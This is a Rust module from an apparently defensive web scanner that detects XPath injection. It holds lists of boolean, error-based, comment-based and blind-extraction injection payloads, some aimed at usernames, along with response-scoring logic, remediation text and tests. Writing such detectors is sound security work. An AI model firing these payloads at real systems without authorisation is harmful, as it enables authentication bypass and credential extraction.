//! XPath Injection Detection
//! Detects XPath injection using boolean and error-based query manipulation.
//! Implements bounded memory usage with zero-copy evidence storage.

use crate::checks::CheckResult;
use crate::findings::Evidence;
use std::borrow::Cow;

/// XPath injection detection probes
pub struct XpathProbes {
    results: Vec<Cow<'static, str>>,
    max_results: usize,
}

impl XpathProbes {
    pub fn new(max_results: usize) -> Self {
        Self {
            results: Vec::with_capacity(max_results.min(512)),
            max_results: max_results.min(512),
        }
    }

    /// Generate boolean-based XPath injection probes
    pub fn boolean_probes(&self) -> impl Iterator<Item = &'static str> {
        [
            "' or '1'='1",
            "\" or \"1\"=\"1",
            "' or 1=1 or ''='",
            "' and '1'='2",
            "' or substring(.,1,1)='a",
            "' or contains(.,'admin')",
        ].into_iter()
    }

    /// Generate error-based XPath injection probes
    pub fn error_probes(&self) -> impl Iterator<Item = &'static str> {
        [
            "' or count(/*)>0 or '",
            "' or name(/*)='root' or '",
            "' or //user or '",
            "1' and type-error() and '",
            "' or number(1)=1 or '",
        ].into_iter()
    }

    /// Generate blind XPath extraction probes (safe)
    pub fn blind_extraction_probes(&self) -> impl Iterator<Item = &'static str> {
        [
            "' or string-length(string(username))>0 or '",
            "' or substring(username,1,1)='a' or '",
            "' or count(/child::*)>0 or '",
            "' or //*[name()='user'] or '",
        ].into_iter()
    }

    /// Generate comment-based XPath probes
    pub fn comment_probes(&self) -> impl Iterator<Item = &'static str> {
        [
            "'<!--comment-->' or '1'='1",
            "'(:comment:)' or '1'='1",
            "'//comment' or '1'='1",
        ].into_iter()
    }

    /// Analyze response for XPath injection indicators
    pub fn analyze_response(
        &mut self,
        original: &str,
        mutated: &str,
        param: &str,
        probe: &str,
    ) -> Option<CheckResult> {
        if self.results.len() >= self.max_results {
            return None;
        }

        let confidence = self.calculate_xpath_confidence(original, mutated, probe);

        if confidence > 0.5 {
            let evidence = Evidence::new()
                .with_parameter(param.to_string())
                .with_evidence_type("xpath_injection")
                .with_payload(Cow::Borrowed(probe))
                .with_original(Cow::Borrowed(original))
                .with_mutated(Cow::Borrowed(mutated))
                .with_confidence(confidence);

            self.results.push(Cow::Owned(format!("XPath probe: {}", probe)));

            return Some(CheckResult {
                vulnerability: "XPath Injection".to_string(),
                severity: "High".to_string(),
                evidence,
                remediation: "Use parameterized XPath queries. Implement strict input validation. Avoid concatenating user input into XPath expressions.".to_string(),
            });
        }
        None
    }

    /// Calculate XPath injection confidence score
    fn calculate_xpath_confidence(&self, original: &str, mutated: &str, probe: &str) -> f64 {
        let mut confidence = 0.0;

        // Check for XPath-specific error patterns
        let xpath_errors = [
            "XPathException",
            "Invalid expression",
            "Failed to evaluate",
            "node-set",
            "org.apache.xpath",
            "javax.xml.xpath",
        ];

        for error in xpath_errors.iter() {
            if mutated.contains(error) && !original.contains(error) {
                confidence += 0.3;
            }
        }

        // Check for boolean differential behavior
        if probe.contains("or '1'='1") || probe.contains("or 1=1") {
            let len_delta = if original.is_empty() {
                0.0
            } else {
                (mutated.len() as i32 - original.len() as i32).abs() as f64 / original.len() as f64
            };
            
            if len_delta > 0.3 || mutated.len() > original.len() * 2 {
                confidence += 0.4;
            }
        }

        // Check for AND-based false condition (should reduce results)
        if probe.contains("and '1'='2") || probe.contains("and 1=2") {
            if mutated.len() < original.len() {
                confidence += 0.3;
            }
        }

        // Check for data exposure indicators
        let exposure_indicators = ["username", "password", "user", "admin", "role"];
        for indicator in exposure_indicators.iter() {
            if mutated.to_lowercase().contains(indicator) && !original.to_lowercase().contains(indicator) {
                confidence += 0.2;
            }
        }

        confidence.min(1.0)
    }

    /// Clear stored results
    pub fn clear(&mut self) {
        self.results.clear();
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_boolean_probes() {
        let probes = XpathProbes::new(100);
        let count: usize = probes.boolean_probes().count();
        assert_eq!(count, 6);
    }

    #[test]
    fn test_error_probes() {
        let probes = XpathProbes::new(100);
        let count: usize = probes.error_probes().count();
        assert_eq!(count, 5);
    }

    #[test]
    fn test_confidence_with_error() {
        let probes = XpathProbes::new(100);
        let original = "<result>data</result>";
        let mutated = "<error>XPathException: Invalid expression</error>";
        
        let confidence = probes.calculate_xpath_confidence(original, mutated, "' or '1'='1");
        assert!(confidence > 0.25);
    }
}
